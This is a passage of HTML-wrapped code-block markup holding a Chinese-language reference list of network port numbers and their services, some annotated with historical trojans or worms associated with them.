class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br></pre></td><td class="code"><pre><span class="line">2端口：管理实用程序</span><br><span class="line">3端口：压缩进程</span><br><span class="line">5端口：远程作业登录</span><br><span class="line">7端口：回显</span><br><span class="line">9端口：丢弃</span><br><span class="line">11端口：在线用户</span><br><span class="line">13端口：时间</span><br><span class="line">17端口：每日引用</span><br><span class="line">18端口：消息发送协议</span><br><span class="line">19端口：字符发生器</span><br><span class="line">20端口：FTP文件传输协议(默认数据口)</span><br><span class="line">21端口：FTP文件传输协议(控制)</span><br><span class="line">22端口：SSH远程登录协议</span><br><span class="line">23端口：telnet(终端仿真协议),木马Tiny Telnet Server开放此端口</span><br><span class="line">24端口：预留给个人用邮件系统</span><br><span class="line">25端口：SMTP服务器所开放的端口，用于发送邮件</span><br><span class="line">27端口：NSW 用户系统 FE</span><br><span class="line">29端口：MSG ICP</span><br><span class="line">31端口：MSG验证,木马Master Paradise、HackersParadise开放此端口</span><br><span class="line">33端口：显示支持协议</span><br><span class="line">35端口：预留给个人打印机服务</span><br><span class="line">37端口：时间</span><br><span class="line">38端口：路由访问协议</span><br><span class="line">39端口：资源定位协议</span><br><span class="line">41端口：图形</span><br><span class="line">42端口：主机名服务</span><br><span class="line">43端口：who is服务</span><br><span class="line">44端口：MPM(消息处理模块)标志协议</span><br><span class="line">45端口：消息处理模块</span><br><span class="line">46端口：消息处理模块(默认发送口)</span><br><span class="line">47端口：NI FTP</span><br><span class="line">48端口：数码音频后台服务</span><br><span class="line">49端口：TACACS登录主机协议</span><br><span class="line">50端口：远程邮件检查协议</span><br><span class="line">51端口：IMP(接口信息处理机)逻辑地址维护</span><br><span class="line">52端口：施乐网络服务系统时间协议</span><br><span class="line">53端口：dns域名服务器</span><br><span class="line">54端口：施乐网络服务系统票据交换</span><br><span class="line">55端口：ISI图形语言</span><br><span class="line">56端口：施乐网络服务系统验证</span><br><span class="line">57端口：预留个人用终端访问</span><br><span class="line">58端口：施乐网络服务系统邮件</span><br><span class="line">59端口：预留个人文件服务</span><br><span class="line">60端口：未定义</span><br><span class="line">61端口：NI邮件</span><br><span class="line">62端口：异步通讯适配器服务</span><br><span class="line">63端口：whois++</span><br><span class="line">64端口：通讯接口</span><br><span class="line">65端口：TACACS数据库服务</span><br><span class="line">66端口：Oracle SQL*NET</span><br><span class="line">67端口：引导程序协议服务端</span><br><span class="line">68端口：引导程序协议客户端</span><br><span class="line">69端口：小型文件传输协议</span><br><span class="line">70端口：信息检索协议</span><br><span class="line">71端口：远程作业服务</span><br><span class="line">72端口：远程作业服务</span><br><span class="line">73端口：远程作业服务</span><br><span class="line">74端口：远程作业服务</span><br><span class="line">75端口：预留给个人拨出服务</span><br><span class="line">76端口：分布式外部对象存储</span><br><span class="line">77端口：预留给个人远程作业输入服务</span><br><span class="line">78端口：修正TCP</span><br><span class="line">79端口：查询远程主机在线用户等信息</span><br><span class="line">80端口：http,用于网页浏览,木马Executor开放此端口</span><br><span class="line">81端口：HOST2名称服务</span><br><span class="line">82端口：传输实用程序</span><br><span class="line">83端口：模块化智能终端ML设备</span><br><span class="line">84端口：公用追踪设备</span><br><span class="line">85端口：模块化智能终端ML设备</span><br><span class="line">86端口：Micro Focus Cobol编程语言</span><br><span class="line">87端口：预留给个人终端连接</span><br><span class="line">88端口：Kerberros安全认证系统</span><br><span class="line">89端口：SU/MIT telnet(终端仿真网关)</span><br><span class="line">90端口：DNSIX 安全属性标记图</span><br><span class="line">91端口：MIT Dover假脱机</span><br><span class="line">92端口：网络打印协议</span><br><span class="line">93端口：设备控制协议</span><br><span class="line">94端口：Tivoli对象调度</span><br><span class="line">96端口：DIXIE协议规范</span><br><span class="line">97端口：快速远程虚拟文件协议</span><br><span class="line">98端口：TAC新闻协议</span><br><span class="line">99端口：后门程序ncx99开放此端口</span><br><span class="line">100端口：未知用途</span><br><span class="line">101端口：NIC 主机名称服务</span><br><span class="line">102端口：消息传输代理</span><br><span class="line">103端口：Genesis 点对点传输网络</span><br><span class="line">105端口：信箱名称服务</span><br><span class="line">106端口：3COM-TSMUX开放端口</span><br><span class="line">107端口：远程Telnet服务</span><br><span class="line">108端口：SNA 网关访问服务</span><br><span class="line">109端口：POP2服务器开放此端口,用于接收邮件</span><br><span class="line">110端口：POP3服务器开放此端口,用于接收邮件</span><br><span class="line">111端口：SUN公司的RPC服务所有端口</span><br><span class="line">112端口：McIDAS 数据传输协议</span><br><span class="line">113端口：认证服务，用于鉴别TCP连接的用户</span><br><span class="line">114端口：音频新闻多点服务</span><br><span class="line">115端口：简单文件传输服务</span><br><span class="line">116端口：ANSA REX 通知</span><br><span class="line">117端口：UUCP 路径服务</span><br><span class="line">118端口：SQL 服务</span><br><span class="line">119端口：NEWS新闻组传输协议，承载USENET通信</span><br><span class="line">121端口：木马BO jammerkillahV开放端口</span><br><span class="line">122端口：SMAKY网络</span><br><span class="line">123端口：网络时间协议，蠕虫病毒会利用，一般关闭</span><br><span class="line">128端口：GSS X许可认证</span><br><span class="line">129端口：密码生成器协议</span><br><span class="line">130端口：Cisco软件开放端口</span><br><span class="line">131端口：Cisco软件开放端口</span><br><span class="line">132端口：Cisco软件开放端口</span><br><span class="line">133端口：统计服务</span><br><span class="line">134端口：INGRES-网络服务</span><br><span class="line">135端口：DCOM服务，冲击波病毒利用，不能关闭</span><br><span class="line">136端口：命名系统</span><br><span class="line">137端口：NETBIOS协议应用，为共享开放</span><br><span class="line">138端口：NETBIOS协议应用，为共享开放</span><br><span class="line">139端口：NETBIOS协议应用，为共享开放</span><br><span class="line">140端口：EMFIS数据服务</span><br><span class="line">141端口：EMFIS控制服务</span><br><span class="line">143端口：Interim邮件访问协议</span><br><span class="line">144端口：UMA软件开放端口</span><br><span class="line">145端口：UAAC协议</span><br><span class="line">149端口：AED 512仿真服务</span><br><span class="line">150端口：SQL(结构化查询语言)-网络</span><br><span class="line">152端口：后台文件传输协议</span><br><span class="line">156端口：SQL(结构化查询语言)服务</span><br><span class="line">158端口：PC邮件服务器</span><br><span class="line">159端口：NSS-路由</span><br><span class="line">160端口：SGMP-陷阱</span><br><span class="line">161端口：简单网络管理协议</span><br><span class="line">162端口：SNMP陷阱</span><br><span class="line">163端口：CMIP/TCP 管理</span><br><span class="line">164端口：CMIP/TCP 代理</span><br><span class="line">166端口：Sirius系统</span><br><span class="line">169端口：发送</span><br><span class="line">170端口：网络附言</span><br><span class="line">177端口：x显示管理控制协议，入侵者通过它访问X-windows操作台</span><br><span class="line">178端口：NextStep Window 服务</span><br><span class="line">179端口：边界网关协议</span><br><span class="line">180端口：图表</span><br><span class="line">181端口：统一</span><br><span class="line">184端口：OC服务器</span><br><span class="line">185端口：远程-KIS</span><br><span class="line">186端口：KIS 协议</span><br><span class="line">187端口：应用通信接口</span><br><span class="line">189端口：队列文件传输</span><br><span class="line">190端口：网关进入控制协议</span><br><span class="line">191端口：Prospero 目录服务</span><br><span class="line">192端口：OSU 网络监视系统</span><br><span class="line">193端口：Spider 远程控制协议</span><br><span class="line">194端口：多线交谈协议</span><br><span class="line">197端口：目录地址服务</span><br><span class="line">198端口：目录地址服务监视器</span><br><span class="line">200端口：IBM系统资源控制器</span><br><span class="line">201端口：AppleTalk(Mac机所用的网络协议)路由保证</span><br><span class="line">202端口：AppleTalk(Mac机所用的网络协议)Name Binding</span><br><span class="line">203端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="line">204端口：AppleTalk(Mac机所用的网络协议)回显</span><br><span class="line">205端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="line">206端口：AppleTalk(Mac机所用的网络协议)区信息</span><br><span class="line">207端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="line">208端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="line">209端口：快速邮件传输协议</span><br><span class="line">210端口：ANSI(美国国家标准协会)Z39.50</span><br><span class="line">211端口：Texas Instruments 914C/G终端</span><br><span class="line">213端口：IPX(以太网所用的协议)</span><br><span class="line">218端口：Netix消息记录协议</span><br><span class="line">219端口：Unisys ARPs</span><br><span class="line">220端口：交互邮件访问协议 v3</span><br><span class="line">223端口：证书分发中心</span><br><span class="line">224端口：masq拨号器</span><br><span class="line">241端口：预留端口 (224-241)</span><br><span class="line">245端口：链接</span><br><span class="line">246端口：显示系统协议</span><br><span class="line">257端口：安全电子交易系统</span><br><span class="line">258端口：Yak Winsock 个人聊天</span><br><span class="line">259端口：有效短程遥控</span><br><span class="line">260端口：开放端口</span><br><span class="line">261端口：IIOP 基于TLS/SSL的命名服务</span><br><span class="line">266端口：SCSI(小型计算机系统接口)on ST</span><br><span class="line">267端口：Tobit David服务层</span><br><span class="line">268端口：Tobit David复制</span><br><span class="line">281端口：个人连结</span><br><span class="line">282端口：Cable端口A/X</span><br><span class="line">286端口：FXP通信</span><br><span class="line">308端口：Novastor备份</span><br><span class="line">313端口：Magenta逻辑</span><br><span class="line">318端口：PKIX时间标记</span><br><span class="line">333端口：Texar安全端口</span><br><span class="line">344端口：Prospero数据存取协议</span><br><span class="line">345端口：Perf分析工作台</span><br><span class="line">346端口：Zebra服务器</span><br><span class="line">347端口：Fatmen服务器</span><br><span class="line">348端口：Cabletron管理协议</span><br><span class="line">358端口：Shrink可上网家电协议</span><br><span class="line">359端口：网络安全风险管理协议</span><br><span class="line">362端口：SRS发送</span><br><span class="line">363端口：RSVP隧道</span><br><span class="line">372端口：列表处理</span><br><span class="line">373端口：Legend公司</span><br><span class="line">374端口：Legend公司</span><br><span class="line">376端口：AmigaEnvoy网络查询协议</span><br><span class="line">377端口：NEC公司</span><br><span class="line">378端口：NEC公司</span><br><span class="line">379端口：TIA/EIA/IS-99调制解调器客户端</span><br><span class="line">380端口：TIA/EIA/IS-99调制解调器服务器</span><br><span class="line">381端口：hp(惠普)性能数据收集器</span><br><span class="line">382端口：hp(惠普)性能数据控制节点</span><br><span class="line">383端口：hp(惠普)性能数据警报管理</span><br><span class="line">384端口：远程网络服务器系统</span><br><span class="line">385端口：IBM应用程序</span><br><span class="line">386端口：ASA信息路由器定义文件.</span><br><span class="line">387端口：Appletalk更新路由.</span><br><span class="line">389端口：轻型目录访问协议</span><br><span class="line">395端口：网络监视控制协议</span><br><span class="line">396端口：Novell(美国Novell公司)Netware(Novell公司出的网络操作系统)over IP</span><br><span class="line">400端口：工作站解决方案</span><br><span class="line">401端口：持续电源</span><br><span class="line">402端口：Genie协议</span><br><span class="line">406端口：交互式邮件支持协议</span><br><span class="line">408端口：Prospero资源管理程序</span><br><span class="line">409端口：Prospero资源节点管理.</span><br><span class="line">410端口：DEC(数据设备公司)远程调试协议</span><br><span class="line">411端口：远程MT协议</span><br><span class="line">412端口：陷阱协定端口</span><br><span class="line">413端口：存储管理服务协议</span><br><span class="line">414端口：信息查询</span><br><span class="line">415端口：B网络</span><br><span class="line">423端口：IBM操作计划和控制开端</span><br><span class="line">424端口：IBM操作计划和控制追踪</span><br><span class="line">425端口：智能计算机辅助设计</span><br><span class="line">427端口：服务起位置</span><br><span class="line">434端口：移动ip代理</span><br><span class="line">435端口：移动ip管理</span><br><span class="line">443端口：基于TLS/SSL的网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP</span><br><span class="line">444端口：简单网络内存分页协议</span><br><span class="line">445端口：Microsoft-DS，为共享开放，震荡波病毒利用，一般应关闭</span><br><span class="line">446端口：DDM-远程关系数据库访问</span><br><span class="line">447端口：DDM-分布式文件管理</span><br><span class="line">448端口：DDM-使用安全访问远程数据库</span><br><span class="line">456端口：木马HACKERS PARADISE开放此端口</span><br><span class="line">458端口：apple quick time软件开放端口</span><br><span class="line">459端口：ampr-rcmd命令</span><br><span class="line">464端口：k密码服务</span><br><span class="line">469端口：广播控制协议</span><br><span class="line">470端口：scx-代理</span><br><span class="line">472端口：ljk-登陆</span><br><span class="line">481端口：Ph服务</span><br><span class="line">487端口：简单异步文件传输</span><br><span class="line">489端口：nest-协议</span><br><span class="line">491端口：go-登陆</span><br><span class="line">499端口：ISO ILL协议</span><br><span class="line">500端口：Internet密钥交换，Lsass开放端口，不能关闭</span><br><span class="line">509端口：陷阱</span><br><span class="line">510端口：FirstClass协议</span><br><span class="line">512端口：远程进程执行</span><br><span class="line">513端口：远程登陆</span><br><span class="line">514端口：cmd命令</span><br><span class="line">515端口：spooler</span><br><span class="line">516端口：可视化数据</span><br><span class="line">518端口：交谈</span><br><span class="line">519端口：unix时间</span><br><span class="line">520端口：扩展文件名称服务器</span><br><span class="line">525端口：时间服务</span><br><span class="line">526端口：新日期</span><br><span class="line">529端口：在线聊天系统服务</span><br><span class="line">530端口：远程过程调用</span><br><span class="line">531端口：聊天</span><br><span class="line">532端口：读新闻</span><br><span class="line">533端口：紧急广播端口</span><br><span class="line">534端口：MegaMedia管理端</span><br><span class="line">537端口：网络流媒体协议</span><br><span class="line">542端口：商业</span><br><span class="line">543端口：Kerberos(软件)v4/v5</span><br><span class="line">544端口：krcmd命令</span><br><span class="line">546端口：DHCPv6 客户端</span><br><span class="line">547端口：DHCPv6 服务器</span><br><span class="line">552端口：设备共享</span><br><span class="line">554端口：Real Time Stream控制协议</span><br><span class="line">555端口：木马PhAse1.0、Stealth Spy、IniKiller开放此端口</span><br><span class="line">556端口：远距离文件服务器</span><br><span class="line">563端口：基于TLS/SSL的网络新闻传输协议</span><br><span class="line">564端口：plan 9文件服务</span><br><span class="line">565端口：whoami查询</span><br><span class="line">566端口：streettalk</span><br><span class="line">567端口：banyan-rpc(远程过程调用)</span><br><span class="line">568端口：DPA成员资格</span><br><span class="line">569端口：MSN成员资格</span><br><span class="line">570端口：demon(调试监督程序)</span><br><span class="line">571端口：udemon(调试监督程序)</span><br><span class="line">572端口：声纳</span><br><span class="line">573端口：banyan-贵宾</span><br><span class="line">574端口：FTP软件代理系统</span><br><span class="line">581端口：Bundle Discovery 协议</span><br><span class="line">582端口：SCC安全</span><br><span class="line">583端口：Philips视频会议</span><br><span class="line">584端口：密钥服务器</span><br><span class="line">585端口：IMAP4+SSL (Use 993 instead)</span><br><span class="line">586端口：密码更改</span><br><span class="line">587端口：申请</span><br><span class="line">589端口：Eye连结</span><br><span class="line">595端口：CAB协议</span><br><span class="line">597端口：PTC名称服务</span><br><span class="line">598端口：SCO网络服务器管理3</span><br><span class="line">599端口：Aeolon Core协议</span><br><span class="line">600端口：Sun IPC(进程间通讯)服务器</span><br><span class="line">601端口：可靠系统登陆服务</span><br><span class="line">604端口：通道</span><br><span class="line">606端口：Cray统一资源管理</span><br><span class="line">608端口：发送人-传递/提供 文件传输器</span><br><span class="line">609端口：npmp-陷阱</span><br><span class="line">610端口：npmp-本地</span><br><span class="line">611端口：npmp-gui( 图形用户界面)</span><br><span class="line">612端口：HMMP指引</span><br><span class="line">613端口：HMMP操作</span><br><span class="line">614端口：SSL(加密套接字协议层)shell(壳)</span><br><span class="line">615端口：Internet配置管理</span><br><span class="line">616端口：SCO(Unix系统)系统管理服务器</span><br><span class="line">617端口：SCO桌面管理服务器</span><br><span class="line">619端口：Compaq(康柏公司)EVM</span><br><span class="line">620端口：SCO服务器管理</span><br><span class="line">623端口：ASF远程管理控制协议</span><br><span class="line">624端口：Crypto管理</span><br><span class="line">631端口：IPP (Internet打印协议)</span><br><span class="line">633端口：服务更新(Sterling软件)</span><br><span class="line">637端口：局域网服务器</span><br><span class="line">641端口：repcmd命令</span><br><span class="line">647端口：DHCP(动态主机配置协议)Failover</span><br><span class="line">648端口：注册登记协议(RRP)</span><br><span class="line">649端口：Cadview-3d软件协议</span><br><span class="line">666端口：木马Attack FTP、Satanz Backdoor开放此端口</span><br><span class="line">808端口：ccproxy http/gopher/ftp (over http)协议</span><br><span class="line">1001端口：木马Silencer，WebEx开放端口</span><br><span class="line">1011端口：木马Doly开放端口</span><br><span class="line">1024端口：动态端口的开始,木马yai开放端口</span><br><span class="line">1025端口：inetinfo.exe(互联网信息服务)木马netspy开放端口</span><br><span class="line">1026端口：inetinfo.exe(互联网信息服务)</span><br><span class="line">1027端口：应用层网关服务</span><br><span class="line">1030端口：应用层网关服务</span><br><span class="line">1031端口：BBN IAD</span><br><span class="line">1033端口：本地网络信息端口</span><br><span class="line">1034端口：同步通知</span><br><span class="line">1036端口：安全部分传输协议</span><br><span class="line">1070端口：木马Psyber Stream，Streaming Audio开放端口</span><br><span class="line">1071端口：网络服务开放端口</span><br><span class="line">1074端口：网络服务开放端口</span><br><span class="line">1080端口：Socks这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET</span><br><span class="line">1110端口：卡巴斯基反病毒软件开放此端口</span><br><span class="line">1125端口：卡巴斯基反病毒软件开放此端口</span><br><span class="line">1203端口：许可证生效端口</span><br><span class="line">1204端口：登陆请求监听端口</span><br><span class="line">1206端口：Anthony数据端口</span><br><span class="line">1222端口：SNI R&amp;D网络端口</span><br><span class="line">1233端口：普遍的附录服务器端口</span><br><span class="line">1234端口：木马SubSeven2.0、Ultors Trojan开放此端口</span><br><span class="line">1243端口：木马SubSeven1.0/1.9开放此端口</span><br><span class="line">1245端口：木马Vodoo，GabanBus，NetBus，Vodoo开放此端口</span><br><span class="line">1273端口：EMC-网关端口</span><br><span class="line">1289端口：JWalk服务器端口</span><br><span class="line">1290端口：WinJa服务器端口</span><br><span class="line">1333端口：密码策略(网络服务)(svchost.exe)</span><br><span class="line">1334端口：网络服务(svchost.exe)</span><br><span class="line">1335端口：数字公正协议</span><br><span class="line">1336端口：即时聊天协议(svchost.exe)</span><br><span class="line">1349端口：注册网络协议端口</span><br><span class="line">1350端口：注册网络协议端口</span><br><span class="line">1371端口：富士通配置协议端口</span><br><span class="line">1372端口：富士通配置协议端口</span><br><span class="line">1374端口：EPI软件系统端口</span><br><span class="line">1376端口：IBM个人-个人软件端口</span><br><span class="line">1377端口：Cichlid许可证管理端口</span><br><span class="line">1378端口：Elan许可证管理端口</span><br><span class="line">1380端口：Telesis网络许可证管理端口</span><br><span class="line">1381端口：苹果网络许可证管理端口</span><br><span class="line">1386端口：CheckSum 许可证管理端口</span><br><span class="line">1387端口：系统开放端口(rundll32.exe)</span><br><span class="line">1388端口：数据库高速缓存端口</span><br><span class="line">1389端口：文档管理端口</span><br><span class="line">1390端口：存储控制器端口</span><br><span class="line">1391端口：存储器存取服务器端口</span><br><span class="line">1392端口：打印管理端口</span><br><span class="line">1393端口：网络登陆服务器端口</span><br><span class="line">1394端口：网络登陆客户端端口</span><br><span class="line">1395端口：PC工作站管理软件端口</span><br><span class="line">1396端口：DVL活跃邮件端口</span><br><span class="line">1397端口：音频活跃邮件端口</span><br><span class="line">1398端口：视频活跃邮件端口</span><br><span class="line">1399端口：Cadkey许可证管理端口</span><br><span class="line">1433端口：Microsoft的SQL服务开放端口</span><br><span class="line">1434端口：Microsoft的SQL服务监视端口</span><br><span class="line">1492端口：木马FTP99CMP开放此端口</span><br><span class="line">1509端口：木马Psyber Streaming Server开放此端口</span><br><span class="line">1512端口：Microsoft Windows网络名称服务</span><br><span class="line">1524端口：许多攻击脚本安装一个后门SHELL于这个端口</span><br><span class="line">1600端口：木马Shivka-Burka开放此端口</span><br><span class="line">1645端口：远程认证拨号用户服务</span><br><span class="line">1701端口：第2层隧道协议</span><br><span class="line">1731端口：NetMeeting音频调用控制</span><br><span class="line">1801端口：Microsoft消息队列服务器</span><br><span class="line">1807端口：木马SpySender开放此端口</span><br><span class="line">1900端口：可被利用ddos攻击，一般关闭</span><br><span class="line">1912端口：金山词霸开放此端口</span><br><span class="line">1981端口：木马ShockRave开放此端口</span><br><span class="line">1999端口：木马BackDoor,yai开放此端口</span><br><span class="line">2000端口：木马GirlFriend 1.3、Millenium 1.0开放此端口</span><br><span class="line">2001端口：木马Millenium 1.0、Trojan Cow,黑洞2001开放此端口</span><br><span class="line">2003端口：GNU 查询</span><br><span class="line">2023端口：木马Pass Ripper开放此端口</span><br><span class="line">2049端口：NFS程序常运行于此端口</span><br><span class="line">2115端口：木马Bugs开放此端口</span><br><span class="line">2140端口：木马Deep Throat 1.0/3.0，The Invasor开放此端口</span><br><span class="line">2500端口：应用固定端口会话复制的RPC客户</span><br><span class="line">2504端口：网络平衡负荷</span><br><span class="line">2565端口：木马Striker开放此端口</span><br><span class="line">2583端口：木马Wincrash 2.0开放此端口</span><br><span class="line">2801端口：木马Phineas Phucker开放此端口</span><br><span class="line">2847端口：诺顿反病毒服务开放此端口</span><br><span class="line">3024端口：木马WinCrash开放此端口</span><br><span class="line">3128端口：squid http代理服务器开放此端口</span><br><span class="line">3129端口：木马Master Paradise开放此端口</span><br><span class="line">3150端口：木马The Invasor,deep throat开放此端口</span><br><span class="line">3210端口：木马SchoolBus开放此端口</span><br><span class="line">3306端口：MySQL开放此端口</span><br><span class="line">3333端口：木马Prosiak开放此端口</span><br><span class="line">3389端口：WINDOWS 2000终端开放此端口</span><br><span class="line">3456端口：inetinfo.exe(互联网信息服务)开放端口，VAT默认数据</span><br><span class="line">3457端口：VAT默认控制</span><br><span class="line">3527端口：Microsoft消息队列服务器</span><br><span class="line">3700端口：木马Portal of Doom开放此端口</span><br><span class="line">3996端口：木马RemoteAnything开放此端口</span><br><span class="line">4000端口：腾讯QQ客户端开放此端口</span><br><span class="line">4060端口：木马RemoteAnything开放此端口</span><br><span class="line">4092端口：木马WinCrash开放此端口</span><br><span class="line">4133端口：NUTS Bootp服务器</span><br><span class="line">4134端口：NIFTY-Serve HMI协议</span><br><span class="line">4141端口：Workflow服务器</span><br><span class="line">4142端口：文档服务器</span><br><span class="line">4143端口：文档复制</span><br><span class="line">4145端口：VVR控制</span><br><span class="line">4321端口：远程Who Is查询</span><br><span class="line">4333端口：微型sql服务器</span><br><span class="line">4349端口：文件系统端口记录</span><br><span class="line">4350端口：网络设备</span><br><span class="line">4351端口：PLCY网络服务</span><br><span class="line">4453端口：NSS警报管理</span><br><span class="line">4454端口：NSS代理管理</span><br><span class="line">4455端口：PR聊天用户</span><br><span class="line">4456端口：PR聊天服务器</span><br><span class="line">4457端口：PR注册</span><br><span class="line">4480端口：Proxy+ HTTP代理端口</span><br><span class="line">4500端口：Lsass开放端口，不能关闭</span><br><span class="line">4547端口：Lanner许可管理</span><br><span class="line">4555端口：RSIP端口</span><br><span class="line">4590端口：木马ICQTrojan开放此端口</span><br><span class="line">4672端口：远程文件访问服务器</span><br><span class="line">4752端口：简单网络音频服务器</span><br><span class="line">4800端口：Icona快速消息系统</span><br><span class="line">4801端口：Icona网络聊天</span><br><span class="line">4802端口：Icona许可系统服务器</span><br><span class="line">4848端口：App服务器-Admin HTTP</span><br><span class="line">4849端口：App服务器-Admin HTTPS</span><br><span class="line">4950端口：木马IcqTrojan开放5000端口</span><br><span class="line">5000端口：木马blazer5，Sockets de Troie开放5000端口，一般应关闭</span><br><span class="line">5001端口：木马Sockets de Troie开放5001端口</span><br><span class="line">5006端口：wsm服务器</span><br><span class="line">5007端口：wsm服务器ssl</span><br><span class="line">5022端口：mice服务器</span><br><span class="line">5050端口：多媒体会议控制协议</span><br><span class="line">5051端口：ITA代理</span><br><span class="line">5052端口：ITA管理</span><br><span class="line">5137端口：MyCTS服务器端口</span><br><span class="line">5150端口：Ascend通道管理协议</span><br><span class="line">5154端口：BZFlag游戏服务器</span><br><span class="line">5190端口：America-Online(美国在线)</span><br><span class="line">5191端口：AmericaOnline1(美国在线)</span><br><span class="line">5192端口：AmericaOnline2(美国在线)</span><br><span class="line">5193端口：AmericaOnline3(美国在线)</span><br><span class="line">5222端口：Jabber客户端连接</span><br><span class="line">5225端口：HP(惠普公司)服务器</span><br><span class="line">5226端口：HP(惠普公司)</span><br><span class="line">5232端口：SGI绘图软件端口</span><br><span class="line">5250端口：i网关</span><br><span class="line">5264端口：3Com网络端口1</span><br><span class="line">5265端口：3Com网络端口2</span><br><span class="line">5269端口：Jabber服务器连接</span><br><span class="line">5306端口：Sun MC组</span><br><span class="line">5321端口：木马Sockets de Troie开放5321端口</span><br><span class="line">5400端口：木马Blade Runner开放此端口</span><br><span class="line">5401端口：木马Blade Runner开放此端口</span><br><span class="line">5402端口：木马Blade Runner开放此端口</span><br><span class="line">5405端口：网络支持</span><br><span class="line">5409端口：Salient数据服务器</span><br><span class="line">5410端口：Salient用户管理</span><br><span class="line">5415端口：NS服务器</span><br><span class="line">5416端口：SNS网关</span><br><span class="line">5417端口：SNS代理</span><br><span class="line">5421端口：网络支持2</span><br><span class="line">5423端口：虚拟用户</span><br><span class="line">5427端口：SCO-PEER-TTA(Unix系统)</span><br><span class="line">5432端口：PostgreSQL数据库</span><br><span class="line">5550端口：木马xtcp开放此端口</span><br><span class="line">5569端口：木马Robo-Hack开放此端口</span><br><span class="line">5599端口：公司远程安全安装</span><br><span class="line">5600端口：公司安全管理</span><br><span class="line">5601端口：公司安全代理</span><br><span class="line">5631端口：pcANYWHERE(软件)数据</span><br><span class="line">5632端口：pcANYWHERE(软件)数据</span><br><span class="line">5673端口：JACL消息服务器</span><br><span class="line">5675端口：V5UA应用端口</span><br><span class="line">5676端口：RA管理</span><br><span class="line">5678端口：远程复制代理连接</span><br><span class="line">5679端口：直接电缆连接</span><br><span class="line">5720端口：MS-执照</span><br><span class="line">5729端口：Openmail用户代理层</span><br><span class="line">5730端口：Steltor&apos;s日历访问</span><br><span class="line">5731端口：netscape(网景)suiteware</span><br><span class="line">5732端口：netscape(网景)suiteware</span><br><span class="line">5742端口：木马WinCrash1.03开放此端口</span><br><span class="line">5745端口：fcopy-服务器</span><br><span class="line">5746端口：fcopys-服务器</span><br><span class="line">5755端口：OpenMail(邮件服务器)桌面网关服务器</span><br><span class="line">5757端口：OpenMail(邮件服务器)X.500目录服务器</span><br><span class="line">5766端口：OpenMail (邮件服务器)NewMail服务器</span><br><span class="line">5767端口：OpenMail (邮件服务器)请求代理曾(安全)</span><br><span class="line">5768端口：OpenMail(邮件服务器) CMTS服务器</span><br><span class="line">5777端口：DALI端口</span><br><span class="line">5800端口：虚拟网络计算</span><br><span class="line">5801端口：虚拟网络计算</span><br><span class="line">5802端口：虚拟网络计算HTTP访问, d</span><br><span class="line">5803端口：虚拟网络计算HTTP访问, d</span><br><span class="line">5900端口：虚拟网络计算机显示0</span><br><span class="line">5901端口：虚拟网络计算机显示1</span><br><span class="line">5902端口：虚拟网络计算机显示2</span><br><span class="line">5903端口：虚拟网络计算机显示3</span><br><span class="line">6000端口：X Window 系统</span><br><span class="line">6001端口：X Window 服务器</span><br><span class="line">6002端口：X Window 服务器</span><br><span class="line">6003端口：X Window 服务器</span><br><span class="line">6004端口：X Window 服务器</span><br><span class="line">6005端口：X Window 服务器</span><br><span class="line">6006端口：X Window 服务器</span><br><span class="line">6007端口：X Window 服务器</span><br><span class="line">6008端口：X Window 服务器</span><br><span class="line">6009端口：X Window 服务器</span><br><span class="line">6456端口：SKIP证书发送</span><br><span class="line">6471端口：LVision许可管理器</span><br><span class="line">6505端口：BoKS管理私人端口</span><br><span class="line">6506端口：BoKS管理公共端口</span><br><span class="line">6507端口：BoKS Dir服务器,私人端口</span><br><span class="line">6508端口：BoKS Dir服务器,公共端口</span><br><span class="line">6509端口：MGCS-MFP端口</span><br><span class="line">6510端口：MCER端口</span><br><span class="line">6566端口：SANE控制端口</span><br><span class="line">6580端口：Parsec主服务器</span><br><span class="line">6581端口：Parsec对等网络</span><br><span class="line">6582端口：Parsec游戏服务器</span><br><span class="line">6588端口：AnalogX HTTP代理端口</span><br><span class="line">6631端口：Mitchell电信主机</span><br><span class="line">6667端口：Internet多线交谈</span><br><span class="line">6668端口：Internet多线交谈</span><br><span class="line">6670端口：木马Deep Throat开放此端口</span><br><span class="line">6671端口：木马Deep Throat 3.0开放此端口</span><br><span class="line">6699端口：Napster文件(MP3)共享服务</span><br><span class="line">6701端口：KTI/ICAD名称服务器</span><br><span class="line">6788端口：SMC软件-HTTP</span><br><span class="line">6789端口：SMC软件-HTTPS</span><br><span class="line">6841端口：Netmo软件默认开放端口</span><br><span class="line">6842端口：Netmo HTTP服务</span><br><span class="line">6883端口：木马DeltaSource开放此端口</span><br><span class="line">6939端口：木马Indoctrination开放此端口</span><br><span class="line">6969端口：木马Gatecrasher、Priority开放此端口</span><br><span class="line">6970端口：real音频开放此端口</span><br><span class="line">7000端口：木马Remote Grab开放此端口</span><br><span class="line">7002端口：使用者&amp; 组 数据库</span><br><span class="line">7003端口：音量定位数据库</span><br><span class="line">7004端口：AFS/Kerberos认证服务</span><br><span class="line">7005端口：音量管理服务</span><br><span class="line">7006端口：错误解释服务</span><br><span class="line">7007端口：Basic监督进程</span><br><span class="line">7008端口：服务器-服务器更新程序</span><br><span class="line">7009端口：远程缓存管理服务</span><br><span class="line">7011端口：Talon软件发现端口</span><br><span class="line">7012端口：Talon软件引擎</span><br><span class="line">7013端口：Microtalon发现</span><br><span class="line">7014端口：Microtalon通信</span><br><span class="line">7015端口：Talon网络服务器</span><br><span class="line">7020端口：DP服务</span><br><span class="line">7021端口：DP服务管理</span><br><span class="line">7100端口：X字型服务</span><br><span class="line">7121端口：虚拟原型许可证管理</span><br><span class="line">7300端口：木马NetMonitor开放此端口</span><br><span class="line">7301端口：木马NetMonitor开放此端口</span><br><span class="line">7306端口：木马NetMonitor，NetSpy1.0开放此端口</span><br><span class="line">7307端口：木马NetMonitor开放此端口</span><br><span class="line">7308端口：木马NetMonitor开放此端口</span><br><span class="line">7323端口：Sygate服务器端</span><br><span class="line">7511端口：木马聪明基因开放此端口</span><br><span class="line">7588端口：Sun许可证管理</span><br><span 